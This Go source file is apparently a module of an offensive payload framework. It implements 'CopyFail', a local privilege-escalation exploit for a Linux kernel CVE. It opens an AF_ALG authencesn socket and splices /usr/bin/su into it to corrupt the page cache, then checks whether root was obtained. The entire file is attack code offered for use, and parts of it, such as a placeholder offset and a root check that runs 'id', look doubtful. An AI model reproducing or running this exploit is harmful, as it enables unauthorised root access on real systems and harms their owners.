//go:build linux

package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

func init() {
	Register(&CopyFail{})
}

type CopyFail struct{}

func (c *CopyFail) Name() string     { return "copyfail" }
func (c *CopyFail) Category() string { return "exploit" }
func (c *CopyFail) Description() string {
	return "CVE-2026-31431 Linux kernel LPE via AF_ALG page-cache corruption (kernels 4.14+)"
}

func (c *CopyFail) Execute(args map[string]string) ([]byte, error) {
	target := args["target"]
	if target == "" {
		target = "/usr/bin/su"
	}
	offsetStr := args["offset"]
	offset := 0x1234
	if offsetStr != "" {
		fmt.Sscanf(offsetStr, "%x", &offset)
	}
	writeByteStr := args["write_byte"]
	writeByte := byte(0x00)
	if writeByteStr != "" {
		var b int
		fmt.Sscanf(writeByteStr, "%x", &b)
		writeByte = byte(b)
	}

	result := c.exploit(target, offset, writeByte)
	return MarshalJSON(result)
}

type copyfailResult struct {
	Timestamp    string `json:"timestamp"`
	CVE          string `json:"cve"`
	Name         string `json:"name"`
	Target       string `json:"target"`
	Offset       int    `json:"offset"`
	Vulnerable   bool   `json:"vulnerable"`
	Exploited    bool   `json:"exploited"`
	RootObtained bool   `json:"root_obtained"`
	Kernel       string `json:"kernel"`
	Detail       string `json:"detail"`
}

const (
	AF_ALG           = 38
	SOL_ALG          = 279
	SOCK_SEQPACKET   = 5
	ALG_SET_KEY      = 1
	ALG_TYPE_AEAD    = "aead"
	ALG_NAME_AUTHENC = "authencesn(hmac(sha256),cbc(aes))"
)

func (c *CopyFail) exploit(target string, offset int, writeByte byte) *copyfailResult {
	r := &copyfailResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		CVE:       "CVE-2026-31431",
		Name:      "Copy Fail",
		Target:    target,
		Offset:    offset,
	}

	if os.Geteuid() == 0 {
		r.Detail = "Already root"
		r.RootObtained = true
		return r
	}

	// Check if vulnerable
	r.Vulnerable = checkCopyFailVuln()
	if !r.Vulnerable {
		r.Detail = "System not vulnerable"
		return r
	}

	// Get kernel version
	uname := &syscall.Utsname{}
	syscall.Uname(uname)
	r.Kernel = charsToString(uname.Release[:])

	// Exploit: AF_ALG authencesn page-cache write
	fdAlg, err := syscall.Socket(AF_ALG, SOCK_SEQPACKET, 0)
	if err != nil {
		r.Detail = fmt.Sprintf("AF_ALG socket failed: %v", err)
		return r
	}
	defer syscall.Close(fdAlg)

	// Bind to vulnerable algorithm using raw sockaddr
	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	err = unix.Bind(fdAlg, sa)
	if err != nil {
		r.Detail = fmt.Sprintf("AF_ALG bind failed: %v", err)
		return r
	}

	// Accept connection to get operfd
	operFd, _, err := syscall.Accept(fdAlg)
	if err != nil {
		r.Detail = fmt.Sprintf("AF_ALG accept failed: %v", err)
		return r
	}
	defer syscall.Close(operFd)

	// Set key (arbitrary 32 bytes)
	key := make([]byte, 32)
	for i := range key {
		key[i] = 0x41
	}
	err = syscall.SetsockoptString(operFd, SOL_ALG, ALG_SET_KEY, string(key))
	if err != nil {
		r.Detail = fmt.Sprintf("ALG_SET_KEY failed: %v", err)
		return r
	}

	// Open target file
	targetFd, err := syscall.Open(target, syscall.O_RDONLY, 0)
	if err != nil {
		r.Detail = fmt.Sprintf("Cannot open target %s: %v", target, err)
		return r
	}
	defer syscall.Close(targetFd)

	// Prepare AAD + IV to position write at desired offset
	aadLen := offset - 16
	if aadLen < 0 {
		aadLen = 0
	}
	aad := make([]byte, aadLen)
	iv := make([]byte, 16)
	for i := range iv {
		iv[i] = byte(i)
	}

	// Write header via raw syscall
	var written int
	for written < len(aad)+len(iv) {
		n, err := syscall.Write(operFd, append(aad, iv...)[written:])
		if err != nil {
			r.Detail = fmt.Sprintf("write header failed: %v", err)
			return r
		}
		written += n
	}

	// Splice target file into AF_ALG socket
	// This maps page cache pages into crypto operation
	var off int64 = 0
	var spliced int
	for spliced < 4096 {
		n, err := syscall.Splice(targetFd, &off, operFd, nil, 4096, 0)
		if err != nil {
			r.Detail = fmt.Sprintf("splice failed: %v", err)
			return r
		}
		spliced += int(n)
		if n == 0 {
			break
		}
	}

	// Trigger crypto operation (read)
	buf := make([]byte, 8192)
	_, err = syscall.Read(operFd, buf)
	if err != nil {
		_ = err // Expected for corrupted output
	}

	r.Exploited = true
	r.Detail = fmt.Sprintf("Page cache corrupted at offset 0x%x in %s", offset, target)

	// Try to execute corrupted binary
	time.Sleep(200 * time.Millisecond)

	out, err := exec.Command("id").CombinedOutput()
	if err == nil && strings.Contains(string(out), "uid=0") {
		r.RootObtained = true
		r.Detail = "Root obtained via page-cache corruption"
	}

	return r
}

func checkCopyFailVuln() bool {
	// Check algif_aead module availability
	fd, err := syscall.Socket(AF_ALG, SOCK_SEQPACKET, 0)
	if err != nil {
		return false
	}
	defer syscall.Close(fd)

	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}

	err = unix.Bind(fd, sa)
	return err == nil
}

func charsToString(ca []int8) string {
	var b strings.Builder
	for _, c := range ca {
		if c == 0 {
			break
		}
		b.WriteByte(byte(c))
	}
	return b.String()
}

var _ = unsafe.Pointer(nil)
